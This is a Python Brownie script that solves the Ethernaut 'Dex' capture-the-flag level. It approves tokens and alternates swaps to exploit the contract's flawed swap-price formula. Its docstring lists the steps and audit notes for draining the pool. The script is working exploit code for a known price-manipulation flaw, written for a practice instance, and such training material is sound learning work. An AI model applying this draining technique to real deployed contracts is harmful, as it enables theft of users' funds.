from os import TMP_MAX
from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert, Attack22, Dex
from eth_utils import keccak

from scripts.sandbox import print_balances


ETHERNAUT_INSTANCE = "0x57Bd513D776Faf277db7451583A03C3652F45c9C"
TOKEN1 = "0x0e216B25a98Df058b4789cf60747317345B4c7F7"
TOKEN2 = "0xF7942f7a505404DBdcFBd2874578b08A4eA29332"

GAS_LIMIT = 12000000


def balances(_target):
    balance1 = _target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
    balance2 = _target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
    print(f"\nIteration: balance 1 = {balance1}, balance 2 = {balance2}\n")


def main():
    player = get_account()
    # target = interface.IDex(ETHERNAUT_INSTANCE)
    target = Dex.at(ETHERNAUT_INSTANCE)
    token1 = interface.IERC20(target.token1())
    token2 = interface.IERC20(target.token2())
    token1.approve(ETHERNAUT_INSTANCE, 1000, {"from": player})
    token2.approve(ETHERNAUT_INSTANCE, 1000, {"from": player})
    print(f"player balance token_1 = {token1.balanceOf(player)}")
    print(f"player balance token_2 = {token2.balanceOf(player)}")

    token_to = token1
    token_from = token2

    price = target.getSwapPrice(
        token_from,
        token_to,
        token_from.balanceOf(player),
        {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
    )
    print(f"\nprice = {price}\n")

    """     swap stuff #1    """
    target.swap(
        token_from,
        token_to,
        token_from.balanceOf(player),
        {"from": player, "gas_limit": GAS_LIMIT},
    )
    balances(target)
    # toggle tokens
    temp = token_to
    token_to = token_from
    token_from = temp
    # get price for next swap
    price = target.getSwapPrice(
        token_from,
        token_to,
        token_from.balanceOf(player),
        {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
    )
    print(f"\nprice = {price}\n")

    """     swap stuff #2    """
    target.swap(
        token_from,
        token_to,
        token_from.balanceOf(player),
        {"from": player, "gas_limit": GAS_LIMIT},
    )
    balances(target)
    # toggle tokens
    temp = token_to
    token_to = token_from
    token_from = temp
    # get price for next swap
    price = target.getSwapPrice(
        token_from,
        token_to,
        token_from.balanceOf(player),
        {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
    )
    print(f"price = {price}")


"""
        Script steps:
        
        1) set player account
        2) define target interface (Dex contract)
        3) define token1 and token2
        4) approve token1 and token2
        
        5) assign tokenTo and tokenFrom (so you can toggle them)
            5a. assign tokenTo / tokenFrom
        
        6) get swap_price

        7) while swap_price < tokenFrom.balanceOf(target)
            8a. perform swap
            8b. toggle to/from
            8c. get swap_price

        8) manually perform the final swap to drain the funds
                        
    ===================================================================

    Audit notes:

        1. Dex contract
            - storage slot 0, 1, 2 -> contain addresses
        2. SwappableToken contract
            - we can ignore this as the approve method is included
              in the Dex contract (for ease)
        3. Function swap() is where the token transfer happens
       
        4. Swap price calculation
        
            - (amount * 'to' price) / ('from' price)
                so: swap price == amount * (token ratio)
    
        5. Swap process ->

            - see 22-simulate_dex.py (this models the swap process)
        
        6. We can beat this level with Python and an IDex interface

"""
